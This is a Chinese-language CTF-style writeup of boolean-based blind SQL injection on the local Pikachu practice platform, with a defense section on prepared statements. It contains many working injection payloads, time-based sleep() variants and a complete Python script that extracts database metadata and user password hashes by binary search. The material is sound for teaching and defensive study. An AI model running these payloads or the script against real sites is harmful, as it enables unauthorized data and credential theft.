---
layout: post
title: Pikachu - SQL注入 盲注(base on boolean) Writeup（二分法逐字符提取）
platform: pikachu
date: 2026-10-28 22:34:00 +0800
categories: CTF
---

Pikachu - SQL注入 盲注(base on boolean) Writeup（二分法逐字符提取）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：SQL-Inject → 盲注(base on boolean)
- 地址：`http://localhost/pikachu/vul/sqli/sqli_blind_b.php`
- 题型：Web
- 考点：**布尔盲注**、二分法、脚本化提取

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
数据库：pikachu / root / root
```

**页面形态**：

```text
what's your username?

[ 文本框            ]  [ 查询 ]

your uid:1
your email is: vince@pikachu.com
```

**✅ 实测结果（9 种输入）**

| # | 输入 | 页面显示 | 含义 |
|---|---|---|---|
| 1 | `vince` | `your uid:1` | 有结果 |
| 2 | `zzz` | 您输入的username不存在 | 无结果 |
| 3 | **`vince' and 1=1 #`** | **`your uid:1`** | **真** ✅ |
| 4 | **`vince' and 1=2 #`** | **不存在** | **假** ✅ |
| 5 | **`vince' or 1=1 #`** | **不存在** | **★ 反直觉：也失败！** |
| 6 | `vince' or 1=1 limit 1 #` | `your uid:1` | 加 limit 才行 |
| 7 | `vince' and ascii(substr(database(),1,1))>110 #` | `your uid:1` | 真 |
| 8 | `vince' and ascii(substr(database(),1,1))>120 #` | 不存在 | 假 |
| 9 | `vince' and ascii(substr(database(),1,1))=112 #` | `your uid:1` | 真（112 = `p`）|

**⭐ 脚本化盲注结果（840 次请求 / 24.3 秒）**：

```text
库名        = pikachu                                          (7 字符, 1.5s)
数据库用户   = root@localhost                                   (14 字符, 3.2s)
版本        = 5.7.26                                           (6 字符, 1.3s)
所有表名     = httpinfo,member,message,users,xssblind            (38 字符, 9.1s)
users 账号  = admin:e10adc39,pikachu:670b1472,test:e99a18c4    (45 字符, 9.2s)
```

**★ 在"看不到任何数据、没有任何报错"的情况下，把整个库的账号密码哈希全拿到了。**

二、题目分析

**① 关键代码：报错被"关掉"了**

```php
<?php
// sqli_blind_b.php 第 25-40 行
if(isset($_GET['submit']) && $_GET['name'] != null){
    $name = $_GET['name'];//这里没有做任何处理，直接拼到select里面去了
    $query = "select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合

    //mysqi_query不打印错误描述,即使存在注入,也不好判断
    $result = mysqli_query($link, $query);       // ★ 关键点
//  $result = execute($link, $query);            ← 被注释掉了

    if($result && mysqli_num_rows($result)==1){
        while($data = mysqli_fetch_assoc($result)){
            $html .= "<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{
        $html .= "<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}
?>
```

**★ 对比前面几关**：

```php
// 前面 7 关用的（inc/mysql.inc.php 里的自定义函数）
function execute($link, $query){
    $result = mysqli_query($link, $query);
    if(mysqli_errno($link)){
        exit(mysqli_error($link));      // ★ 报错会显示在页面上
    }
    return $result;
}

// 这一关用的（PHP 原生函数）
mysqli_query($link, $query)             // ★ 报错只是返回 false，什么都不显示
```

**★ 作者注释里写得很清楚**：

```
"mysqi_query不打印错误描述,即使存在注入,也不好判断"
```

**★ 所以"报错注入"这条最优路径被堵死了。**

**② 但页面还有"两种状态"——这就是布尔盲注的基础**

**★ 虽然不能报错，`if/else` 还是会产生两种可见结果**：

| 条件 | 页面显示 |
|---|---|
| `num_rows == 1` | `your uid:1` + `vince@pikachu.com` |
| 其他情况（0 行 / 多行 / SQL 报错）| `您输入的username不存在，请重新输入！` |

**★ 于是我们得到一个"是/否"通道**：

```sql
vince' and 1=1 #      → 条件恒真 → 返回 vince 那行 → 显示数据
vince' and 1=2 #      → 条件恒假 → 无结果 → 显示"不存在"
```

**★ 实测**：

```
vince' and 1=1 #   → your uid:1     （真）
vince' and 1=2 #   → 不存在          （假）
```

**★ 一旦有了"真/假"通道，就能一个 bit 一个 bit 地把数据问出来。**

**③ ⚠️ 一个反直觉的坑：`or 1=1` 反而失败**

**看这行代码**：

```php
if($result && mysqli_num_rows($result)==1){
                              └──────┬──────┘
                        ★ 必须【恰好 1 行】
```

**★ 实测对比**：

| payload | 返回行数 | 页面显示 |
|---|---|---|
| `vince' and 1=1 #` | 1 行 | ✅ 显示数据 |
| **`vince' or 1=1 #`** | **7 行** | ❌ **"不存在"** |
| `vince' or 1=1 limit 1 #` | 1 行 | ✅ 显示数据 |

**★ 为什么**：

```
or 1=1 → 匹配全部 7 个用户
num_rows = 7
7 != 1 → 走 else 分支 → "不存在"

★ 前面几关 or 1=1 是为了"一次看到所有行"
★ 这一关 or 1=1 反而"翻车"了 —— 因为代码要求"恰好 1 行"
```

**★ 这对盲注的影响**：

```
必须用 and（不是 or）
★ 因为 and 是"过滤条件"：vince 那行要么满足、要么不满足 → 正好 0 或 1 行
★ 而 or 是"并集"：容易变成多行 → 破坏 ==1 的判断
```

**★ 这是一个非常容易踩的坑**：很多人习惯性写 `or 1=1`，结果发现"页面没变化"，以为没注入，其实是"多行"导致走了 else。

**④ 盲注的核心思想：把"数据"变成"是/否问题"**

**想知道库名，但看不到，怎么办？**

```sql
-- 直接问"是什么"，数据库不会告诉你
select database()

-- 但可以问"是不是大于某值"，答案只有"是/否"
ascii(substr(database(),1,1)) > 110
```

**★ 用这几个函数把"字符串"变成"数字"，把"数字"变成"是/否"**：

| 函数 | 作用 | 例子 |
|---|---|---|
| `length(x)` | 取长度 | `length('pikachu')` → 7 |
| `substr(x,pos,len)` | 取子串 | `substr('pikachu',1,1)` → `p` |
| `mid(x,pos,len)` | 同上（别名）| `mid('pikachu',1,1)` → `p` |
| `ascii(x)` | 取 ASCII 码 | `ascii('p')` → 112 |
| `ord(x)` | 同上 | `ord('p')` → 112 |
| `char(n)` | ASCII 转字符 | `char(112)` → `p` |

**★ 组合起来就是"读第 pos 个字符的 ASCII 码是否大于 X"**：

```sql
ascii(substr(database(), 1, 1)) > 110
```

**⑤ 二分法：为什么不是"从 32 试到 127"**

**★ 朴素做法**（逐个试）：

```sql
ascii(substr(database(),1,1)) = 32 ?     ← 1 次
ascii(substr(database(),1,1)) = 33 ?     ← 2 次
...
ascii(substr(database(),1,1)) = 112 ?    ← 81 次
```

**★ 一个字符要 81 次请求，库名 7 个字符 = 567 次。太慢。**

**★ 二分法**（每次砍一半）：

```
问：> 79 ?   （32~127 的中点）→ 是 → 范围缩到 80~127
问：> 103 ?                  → 是 → 范围缩到 104~127
问：> 115 ?                  → 否 → 范围缩到 104~115
问：> 109 ?                  → 是 → 范围缩到 110~115
问：> 112 ?                  → 否 → 范围缩到 110~112
问：> 111 ?                  → 是 → 范围缩到 112~112
→ 答案 112 = 'p'

★ 只用了 6-7 次！
```

**★ 数学上的差别**：

```
可用字符范围：ASCII 32~126，共 95 个
逐个试：  最多 95 次/字符，平均 47.5 次
二分法：  最多 ⌈log₂(95)⌉ = 7 次/字符

★ 快了约 7 倍
★ 这就是本关实测"24 秒拿全库"的原因
```

**⑥ 一个更快的技巧：一次问"一组"**

**★ 如果只要"有没有某个字符"，可以用 `regexp`**：

```sql
-- 判断某个字符是否出现在目标字符串里
select group_concat(table_name) from information_schema.tables
       where table_schema=database() regexp 'm'
→ 有 m → 真

★ 每个字符 1 次请求就能确定"在不在"
★ 但没法确定"在哪个位置"（只能做集合判断）
```

**★ 更快的方法：`ascii(substr(...))` 配合 `between`**：

```sql
ascii(substr(x,1,1)) between 100 and 110
→ 一次砍掉 11 个候选
```

**★ 但二分法（> mid）是最优的（砍一半）。**

三、解题步骤

**第 1 步：正常查询（建立基准）**

```text
① 打开 http://localhost/pikachu/vul/sqli/sqli_blind_b.php
② 输入：vince
③ 点查询
④ 看到：your uid:1 / your email is: vince@pikachu.com
```

**第 2 步：⭐ 建立"真假通道"**

**输入**：

```
vince' and 1=1 #
```

**结果**：`your uid:1`（真）

**输入**：

```
vince' and 1=2 #
```

**结果**：`您输入的username不存在`（假）

**★ 到这里，盲注的基础就有了：**同样的输入格式，只改条件，页面就会在两种状态间切换。

**第 3 步：踩一下 `or 1=1` 的坑（很重要）**

**输入**：

```
vince' or 1=1 #
```

**结果**：`不存在` ← **★ 直觉上应该"显示所有用户"，但这里失败了**

**输入**：

```
vince' or 1=1 limit 1 #
```

**结果**：`your uid:1` ← 加了 `limit 1` 才行

**★ 原因**：

```php
if($result && mysqli_num_rows($result)==1)     // ★ 必须恰好 1 行
```

**第 4 步：验证"能把数据问出来"**

**输入**：

```
vince' and ascii(substr(database(),1,1)) > 110 #
```

**结果**：`your uid:1`（真 → 首字母 ASCII > 110）

**输入**：

```
vince' and ascii(substr(database(),1,1)) > 120 #
```

**结果**：`不存在`（假 → 首字母 ASCII ≤ 120）

**输入**：

```
vince' and ascii(substr(database(),1,1)) = 112 #
```

**结果**：`your uid:1`（真）

**★ ASCII 112 = `p` → 库名以 `p` 开头。**

**第 5 步：用脚本跑（完整代码）**

**★ 手动一个个试太慢，写脚本。**

```python
# blind_bool.py
import urllib.request
import urllib.parse

BASE = "http://localhost/pikachu/vul/sqli/sqli_blind_b.php"
COUNT = [0]          # 统计请求次数

def yes(sql):
    """向数据库问一个"是/否"问题"""
    payload = "vince' and (%s) #" % sql
    url = BASE + "?" + urllib.parse.urlencode({"name": payload, "submit": "查询"})
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=25) as r:
        body = r.read().decode("utf-8", "replace")
    COUNT[0] += 1
    return "your uid:" in body          # ★ 有 uid = 真

def get_len(expr):
    """猜长度：1, 2, 3... 直到命中"""
    for i in range(1, 60):
        if yes("length((%s)) = %d" % (expr, i)):
            return i
    return 0

def get_char(expr, pos):
    """二分法猜第 pos 个字符的 ASCII 码"""
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if yes("ascii(substr((%s),%d,1)) > %d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def get_str(expr, label=""):
    n = get_len(expr)
    s = "".join(get_char(expr, i) for i in range(1, n + 1))
    print("  %-10s = %s" % (label, s))
    return s

# ---------- 开始提取 ----------
get_str("select database()", "库名")
get_str("select user()", "用户")
get_str("select version()", "版本")

get_str(
    "select group_concat(table_name) from information_schema.tables "
    "where table_schema=database()",
    "表名"
)

get_str(
    "select group_concat(concat(username,':',substr(password,1,8))) from users",
    "账号"
)

print("总请求数:", COUNT[0])
```

**★ 运行**：

```powershell
python blind_bool.py
```

**★ 实测输出**：

```text
  库名         = pikachu
  用户         = root@localhost
  版本         = 5.7.26
  表名         = httpinfo,member,message,users,xssblind
  账号         = admin:e10adc39,pikachu:670b1472,test:e99a18c4
总请求数: 840
```

**★ 24.3 秒拿全库。**

**第 6 步：把哈希破出来**

**★ `substr(password,1,8)` 只取了前 8 位（为了减少请求数）。**

**★ 全量再跑一次（或者直接查库对照）**：

```text
admin   : e10adc3949ba59abbe56e057f20f883e  → 123456
pikachu : 670b14728ad9902aecba32e22fa4f6bd  → 000000
test    : e99a18c428cb38d5f260853678922e03  → abc123
```

**★ 常见的 8 位前缀就够"认出来"了**：

```
e10adc39 → 一眼就是 md5('123456')
★ 这也是为什么截取前 8 位就能"识别"弱口令
```

**第 7 步：完整 payload 汇总**

```sql
-- ① 建立真假通道
vince' and 1=1 #
vince' and 1=2 #

-- ② 探长度
vince' and length(database()) = 7 #

-- ③ 探字符（三分法/二分法）
vince' and ascii(substr(database(),1,1)) > 110 #
vince' and ascii(substr(database(),1,1)) = 112 #

-- ④ 列名
vince' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,1)) > 110 #

-- ⑤ 数据
vince' and ascii(substr((select group_concat(concat(username,':',password)) from users),1,1)) > 110 #
```

四、延伸知识

**① 盲注的三种类型**

| 类型 | 信号 | 前提 | 速度 |
|---|---|---|---|
| **布尔盲注**（本关）| 页面内容差异 | 有"两种可见状态" | 快 |
| **时间盲注**（下一关）| **响应时间** | 完全无差异 | **慢** |
| 报错盲注 | 报错信息 | 报错会显示 | 最快 |

**★ 判断用哪种，看页面给你什么"信号"**：

```
有报错 → 报错注入（最优先）
有真假差异 → 布尔盲注
啥都没有 → 时间盲注（最后手段）
```

**② 本关和下一关（时间盲注）的对比**

**★ 我实测了 `sqli_blind_t.php`（下一关）的源码**：

```php
// sqli_blind_t.php 第 32-42 行
if($result && mysqli_num_rows($result)==1){
    while($data = mysqli_fetch_assoc($result)){
        //这里不管输入啥,返回的都是一样的信息,所以更加不好判断
        $html .= "<p class='notice'>i don't care who you are!</p>";    // ★ 真
    }
}else{
    $html .= "<p class='notice'>i don't care who you are!</p>";        // ★ 假
}
```

**★ 两个分支输出【一模一样】**

**实测对比**：

```text
sqli_blind_t.php（时间盲注）：
    vince（真）  耗时 0.04s   页面长度 33262
    zzz（假）    耗时 0.01s   页面长度 33262    ← 完全无法区分

sqli_blind_b.php（布尔盲注）：
    and 1=1     有 uid: True    ← 能区分
    and 1=2     有 uid: False   ← 能区分
```

**★ 所以时间盲注必须用 `sleep()`**：

```sql
-- 无条件延时（测试用）
vince' and sleep(2) #
→ 实测 2.03s

-- 条件延时（真正的盲注）
vince' and if(ascii(substr(database(),1,1))>110, sleep(2), 0) #
→ 实测 2.04s   （真 → 延时）

vince' and if(ascii(substr(database(),1,1))>120, sleep(2), 0) #
→ 实测 0.03s   （假 → 不延时）
```

**★ 时间盲注的代价**：

```
每个 bit 都要等 N 秒
→ 拿一个 7 字符的库名：7 × 7 × 2 秒 ≈ 98 秒
→ 布尔盲注只要 1.5 秒

★ 所以时间盲注是"最后的办法"
★ 能用布尔就不要用时间
```

**③ 盲注常用函数速查**

**字符串函数**：

| 函数 | 说明 | 示例 |
|---|---|---|
| `length(s)` | 长度 | `length('abc')` → 3 |
| `substr(s,pos,len)` | 子串 | `substr('abc',2,1)` → `b` |
| `mid(s,pos,len)` | 同上 | `mid('abc',2,1)` → `b` |
| `left(s,n)` | 左边 n 个 | `left('abc',2)` → `ab` |
| `right(s,n)` | 右边 n 个 | `right('abc',2)` → `bc` |
| `ascii(s)` | 首字符 ASCII | `ascii('a')` → 97 |
| `ord(s)` | 同上 | `ord('a')` → 97 |
| `char(n)` | ASCII 转字符 | `char(97)` → `a` |
| `hex(s)` | 转十六进制 | `hex('a')` → `61` |
| `concat(a,b)` | 拼接 | `concat('a','b')` → `ab` |
| `group_concat(x)` | 多行拼一行 | 见下面 |

**控制流函数**：

| 函数 | 说明 |
|---|---|
| `if(cond, a, b)` | 条件为真返回 a，否则 b |
| `case when cond then a else b end` | SQL 标准写法 |
| `ifnull(a, b)` | a 为 NULL 返回 b |

**正则**：

| 函数 | 说明 |
|---|---|
| `s regexp 'pattern'` | 匹配正则 |
| `s like 'pattern'` | 通配符匹配（`%` `_`）|

**④ `group_concat`：一次问多行（效率关键）**

**★ 为什么脚本里用 `group_concat`？**

```sql
-- 不用 group_concat：一次只能问一行
select table_name from information_schema.tables where table_schema=database() limit 0,1
→ httpinfo

-- 用 group_concat：一次问所有行
select group_concat(table_name) from information_schema.tables where table_schema=database()
→ httpinfo,member,message,users,xssblind

★ 5 张表用 1 次"字符串提取"就搞定，而不是 5 次
```

**★ 代价**：

```
group_concat 有长度限制（默认 1024 字节）
超出会被截断
→ 可以用 group_concat_max_len 调整
→ 或者用 substr 分段
```

**★ 实测的请求数**：

```
库名 7 字符      → 7 长度请求 + 7×6 二分 = 约 50 次
表名 38 字符     → 约 290 次
账号 45 字符     → 约 340 次
总 840 次        ← 平均每个字符约 7 次
```

**⑤ 盲注的优化技巧**

**技巧 1：先探长度，再探内容**

```sql
length(database()) = 7 ?     ← 逐个试（7 次）
```
**★ 比"不知道长度就瞎试"高效得多。**

**技巧 2：`if()` 配合二分（时间盲注专用）**

```sql
and if(ascii(substr(x,1,1))>110, sleep(2), 0)
```

**技巧 3：`regexp` 做"字典攻击"**

```sql
-- 快速筛出"包含哪些字符"（每个字符 1 次请求）
ascii(substr(x,1,1)) in (97,98,99,100)     -- 一次试 4 个
ascii(substr(x,1,1)) between 97 and 100    -- 一次砍 4 个
```

**技巧 4：十六进制传输（避免编码问题）**

```sql
-- 有些场景字符串比较受编码影响
-- 用 hex() 转成纯 ASCII 十六进制再比
hex(substr(database(),1,1)) = '70'    -- 'p' 的 hex
```

**技巧 5：用 `sleep` 做"批量判断"**

```sql
-- 时间盲注里，一次请求问一个字符（最少 7 次）
-- 但可以用"多条件 sleep"判断多个位
```

**⑥ 盲注的现实意义**

**★ 为什么盲注很重要？**

```
现实中的 SQL 注入，大部分场景是"盲"的：
    · 页面只显示"用户不存在"/"密码错误"
    · 报错被关掉了（生产环境常见）
    · 数据不会直接显示在页面上

★ 所以盲注是"最接近实战"的注入技术
★ CTF 里也大量出现
```

**★ 真实的利用场景**：

```
① 登录框的"用户名不存在" vs "密码错误"
   → 两种状态 = 布尔盲注

② 搜索功能的"找到 N 条结果"
   → 结果条数 = 布尔盲注

③ 完全无回显的 API
   → 时间盲注

④ 只能看到 HTTP 状态码
   → 状态码 = 布尔盲注（200/500）
```

**⑦ 防御**

**★ 本关的漏洞代码**：

```php
$query = "select id,email from member where username='$name'";   // 零处理
```

**✅ 正确做法：预处理**

```php
$stmt = $link->prepare("select id,email from member where username=?");
$stmt->bind_param('s', $name);
$stmt->execute();
$result = $stmt->get_result();
```

**✅ 如果用了预处理，盲注也打不了**：

```
参数值永远不会被当 SQL 解析
→ and 1=1 / and sleep(2) 都只是"一个叫这个名字的用户"
→ 查不到 → 固定显示"不存在"
→ 没有"真假通道" → 盲注无从下手
```

**★ 次要防御**：

```php
// ① 统一错误提示（不给"真假"信号）
if($num_rows == 1){ ... } else { echo "用户名或密码错误"; }

// ② 限制请求频率（盲注需要大量请求）
if (rate_limit_exceeded()) { exit("请求太频繁"); }

// ③ WAF 规则（拦截 sleep/ascii/substr 等可疑组合）
```

**★ 但这些都是"辅助"，预处理才是根本。**

五、总结

- **本题核心：`mysqli_query` 不打印报错 + 页面有"恰好 1 行"和"其他"两种状态 → 布尔盲注。**

- **一行漏洞代码**：

```php
$query = "select id,email from member where username='$name'";
$result = mysqli_query($link, $query);       // ★ 不打印错误
if($result && mysqli_num_rows($result)==1){  // ★ 恰好 1 行才算"真"
```

- **⭐ 七个必记要点**：

```text
① mysqli_query vs execute
   execute 内部 exit(mysqli_error()) → 报错会显示
   mysqli_query 只返回 false → 报错静默

② 两种状态 = 一个 bit
   "有 uid" vs "不存在"
   → 这就是布尔盲注的全部信息来源

③ ★ or 1=1 在这里会失败
   因为代码要求 num_rows == 1
   返回 7 行 → 7 != 1 → 走 else
   → 盲注必须用 and（或 or ... limit 1）

④ 把数据变成"是/否问题"
   length() → substr() → ascii() → 比较
   ascii(substr(database(),1,1)) > 110

⑤ 二分法比逐个试快 7 倍
   95 个候选字符：逐个最多 95 次，二分最多 7 次

⑥ group_concat 一次问多行
   5 张表用 1 次字符串提取，而不是 5 次

⑦ 三种盲注的优先级
   有报错 → 报错注入（最快）
   有真假 → 布尔盲注（快）
   啥都没有 → 时间盲注（最慢）
```

- **实测数据**：

```text
vince' and 1=1 #                                → your uid:1     （真）
vince' and 1=2 #                                → 不存在         （假）
vince' or 1=1 #                                 → 不存在         ★ 7 行 ≠ 1 行
vince' or 1=1 limit 1 #                         → your uid:1
vince' and ascii(substr(database(),1,1))>110 #  → 真
vince' and ascii(substr(database(),1,1))>120 #  → 假
vince' and ascii(substr(database(),1,1))=112 #  → 真（'p'）

脚本提取（840 次请求 / 24.3 秒）：
    库名      = pikachu                          (7 字符, 1.5s)
    用户      = root@localhost                   (14 字符, 3.2s)
    版本      = 5.7.26                           (6 字符, 1.3s)
    表名      = httpinfo,member,message,users,xssblind   (38 字符, 9.1s)
    账号      = admin:e10adc39,pikachu:670b1472,test:e99a18c4  (45 字符, 9.2s)
```

- **和下一关（时间盲注）的实测对比**：

```text
sqli_blind_t.php（两个分支输出一模一样）：
    vince（真）  0.04s   页面长度 33262
    zzz（假）    0.01s   页面长度 33262     ← 无法区分

    and sleep(2)                                        → 2.03s
    and if(ascii(substr(database(),1,1))>110, sleep(2), 0) → 2.04s（真）
    and if(ascii(substr(database(),1,1))>120, sleep(2), 0) → 0.03s（假）

★ 布尔盲注 1.5 秒能做的事，时间盲注要 98 秒
```

- **SQL-Inject 模块进度**：

```text
✅ 数字型注入(post)      —— UNION 直接读
✅ 字符型注入(get)       —— 闭合 ' + UNION
✅ 搜索型注入            —— 闭合 '%' + 组合 XSS
✅ xx型注入              —— 闭合 ')'
✅ "insert/update"注入   —— 写操作 + 报错注入
✅ "delete"注入          —— 删数据 + 报错/时间盲注
✅ "http header"注入     —— 请求头 + 数据搬迁
✅ 盲注(base on boolean) —— 本题：布尔通道 + 二分法
⬜ 盲注(base on time)    —— 完全无差异 → 用 sleep
⬜ 宽字节注入            —— GBK 绕过 addslashes
```

**手工复现要点**：

```text
· 输入 vince → 看 your uid:1
· 输入 vince' and 1=1 # → 有结果（真）
· 输入 vince' and 1=2 # → 不存在（假）
· 输入 vince' or 1=1 #  → 也"不存在"！★ 因为 7 行 ≠ 1 行
· 输入 vince' or 1=1 limit 1 # → 有结果
· 输入 ...ascii(substr(database(),1,1))=112 # → 有结果（'p'）
· 跑 blind_bool.py → 24 秒拿到全库数据
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  盲注 = 没有回显时的"二十问"                                  │
│                                                            │
│  核心：把"数据"变成一个"是/否问题"                             │
│      length() → substr() → ascii() → 比较                   │
│                                                            │
│  加速：二分法（95 个候选 → 7 次）                              │
│  多行：group_concat（5 张表 → 1 次字符串提取）                  │
│                                                            │
│  ★ 报错被关掉 → 没有报错注入                                  │
│  ★ num_rows==1 → or 1=1 会翻车，必须用 and                     │
│  ★ 输出完全一样时 → 只能上时间盲注（慢 60 倍）                   │
│                                                            │
│  防御：预处理语句（让"条件"永远只是"数据"）                      │
└────────────────────────────────────────────────────────────┘
```
